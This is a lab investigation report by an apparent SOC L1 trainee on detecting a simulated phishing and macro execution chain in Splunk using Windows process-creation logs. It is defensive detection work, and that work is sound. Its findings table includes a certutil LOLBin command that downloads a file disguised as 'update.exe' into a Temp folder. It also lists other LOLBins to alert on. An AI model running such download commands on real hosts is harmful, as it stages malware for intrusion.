# Investigation Report — Scenario 05: Phishing Attack Detection

## Overview

| Field | Details |
|---|---|
| **Incident ID** | IR-2026-006 |
| **Scenario** | Phishing Attack Detection |
| **Date of Simulation** | 20 June 2026 |
| **Analyst** | Jimil Joshi |
| **Host** | JIMIL-JOSHI |
| **Primary Account** | hp |
| **Severity** | 🟠 Medium-High |
| **MITRE ATT&CK Techniques** | T1566.001, T1204.002, T1105 |
| **Tools Used** | Splunk Enterprise (Search & Reporting), Windows Event Logs (Event ID 4688) |

---

## Scenario Description

This scenario simulates a phishing attack chain in which a user receives an email with a malicious attachment. Upon opening the attachment, a macro is triggered which attempts to download and execute a second-stage payload using a Living-off-the-Land Binary (LOLBin).

Since a real email gateway / mail flow log source was not available in this lab environment, the **delivery stage (T1566.001)** is narratively simulated, and detection begins at the point where the malicious document's macro would fire — generating real, logged process-creation events from that point forward. This mirrors a realistic SOC L1 constraint: analysts frequently pick up an attack mid-chain from endpoint telemetry even when email-layer visibility is unavailable.

**Simulated attack narrative:**
1. User receives a phishing email disguised as an invoice, containing a malicious Office attachment.
2. User opens the attachment; the macro fires (simulated).
3. The macro spawns a LOLBin (`certutil.exe`) to download a second-stage payload.
4. The downloaded payload is executed (simulated).

---

## Investigation Steps

1. Confirmed Windows process-creation auditing (Event ID 4688) was active and logging on the lab host.
2. Searched for evidence of the simulated macro trigger (`WINWORD` reference in command line).
3. Searched specifically for `certutil.exe` executions matching known LOLBin download syntax (`-urlcache -split -f`).
4. Searched for the simulated payload execution marker (`Payload executed`).
5. Combined all three indicators into a single chronological query to reconstruct the full attack timeline.
6. Verified whether the dropped file (`update.exe`) generated an independent process-creation event upon execution.

---

## Findings

| Time | Host | Account | Process | Command Line | Significance |
|---|---|---|---|---|---|
| 2026-06-20 19:20:26 | JIMIL-JOSHI | hp | cmd.exe | `cmd.exe /c echo Simulating WINWORD.EXE` | Simulated malicious macro trigger (T1566.001 / T1204.002) |
| 2026-06-20 19:21:14 | JIMIL-JOSHI | hp | cmd.exe | `cmd.exe /c echo Payload executed` | First simulated payload execution attempt |
| 2026-06-20 19:24:48 | JIMIL-JOSHI | hp | cmd.exe | `cmd.exe /c echo Payload executed` | Second simulated payload execution attempt |
| 2026-06-20 19:30:03 | JIMIL-JOSHI | hp | certutil.exe | `certutil.exe -urlcache -split -f https://raw.githubusercontent.com C:\Users\hp\AppData\Local\Temp\update.exe` | Payload download via LOLBin abuse (T1105 — Ingress Tool Transfer) |

**Detection gap identified:** The dropped file `update.exe` did not generate its own independent Event ID 4688 entry upon execution. In this simulation, the file was a plain text placeholder rather than a real executable, so it likely did not actually launch as a process. In a real-world attack, a genuine payload would generate a distinct, separately loggable process-creation event at execution. This is documented as a known limitation of the simulation rather than a detection failure of the SPL logic itself — analysts should be aware that non-functional or corrupted droppers can create a false sense of "no further activity" in process logs.

---

## Attack Timeline

```
19:20:26  →  Simulated macro trigger (WINWORD reference)
19:21:14  →  Simulated payload execution attempt #1
19:24:48  →  Simulated payload execution attempt #2
19:30:03  →  certutil.exe LOLBin payload download (T1105)
```

*Note: timestamps reflect simulation execution order, not necessarily the order a real attack chain would unfold in (real-world: download typically precedes execution). This is flagged here for analytical transparency.*

---

## Screenshots

| Screenshot | Description |
|---|---|
| `scenario05_01_macro_and_payload_execution.png` | Splunk table showing the simulated macro trigger (`echo Simulating WINWORD.EXE`) and both payload execution attempts (`echo Payload executed`) |
| `scenario05_02_certutil_download.png` | Splunk result confirming the certutil LOLBin payload download (T1105) at 19:30:03 |
| `scenario05_03_combined_attack_chain.png` | Combined query result showing the full attack chain reconstructed in one search |

---

## MITRE ATT&CK Mapping

| Technique ID | Technique Name | Stage |
|---|---|---|
| T1566.001 | Phishing: Spearphishing Attachment | Initial Access (narrated/simulated) |
| T1204.002 | User Execution: Malicious File | Execution |
| T1105 | Ingress Tool Transfer | Command and Control / Execution |

---

## Verdict & Analysis

This simulation successfully demonstrates detectable indicators of a phishing-driven execution chain using only native Windows Event ID 4688 logging — no EDR or email gateway required. The most reliable and production-relevant detection in this scenario is the **certutil LOLBin download pattern** (`-urlcache -split -f`), which is a well-documented, high-fidelity indicator with very low false-positive risk in most enterprise environments, since legitimate use of certutil for URL caching is rare outside of certificate management contexts.

The macro-trigger and payload-execution evidence in this lab are simulated placeholders (using `echo` and `cmd.exe`) rather than genuine Office/macro telemetry, since no real malicious document or VBA macro was used. This is an accepted limitation of a safe, non-malicious home lab simulation and is documented transparently rather than presented as equivalent to real macro telemetry (which would normally appear as Office spawning `cmd.exe`/`powershell.exe` as a child process — see the generalized detection query in the `.spl` file for the production-equivalent logic).

**Verdict:** 🟠 Confirmed simulated phishing execution chain — payload delivery and LOLBin-based download technique successfully detected via Windows native logging.

---

## Response Actions

**Immediate:**
- Isolate the affected host from the network pending full investigation.
- Terminate any active `certutil.exe` processes with suspicious URL-cache arguments.
- Quarantine and analyze the downloaded file (`update.exe`) in a sandboxed environment.
- Reset credentials for the affected user account as a precaution.

**Recommended:**
- Enable Group Policy restrictions to block or alert on `certutil -urlcache` usage outside of approved administrative contexts.
- Deploy email attachment sandboxing / detonation for inbound Office documents.
- Enable PowerShell Script Block Logging (Event ID 4104) and Sysmon for richer parent-child process visibility (Office → script interpreter chains).
- Conduct user awareness training on phishing identification, focused on invoice/attachment-themed lures.
- Add a correlation rule alerting on any LOLBin (`certutil`, `mshta`, `regsvr32`, `bitsadmin`) making outbound HTTP/HTTPS requests.

---

## Conclusion

Scenario 05 demonstrates detection of a simulated phishing attack chain — from malicious attachment execution through LOLBin-based payload download — using native Windows Event ID 4688 logging in Splunk. The investigation highlights both a high-confidence detection technique (certutil URL-cache abuse) and an honest limitation of the simulation (non-functional dropped payload not generating a separate execution event), reflecting the kind of nuanced, evidence-based reporting expected of a SOC L1 analyst.

---

**Investigated by:** Jimil Joshi
**Role:** SOC L1 Analyst (Simulated Lab Environment)
**Report Status:** Final
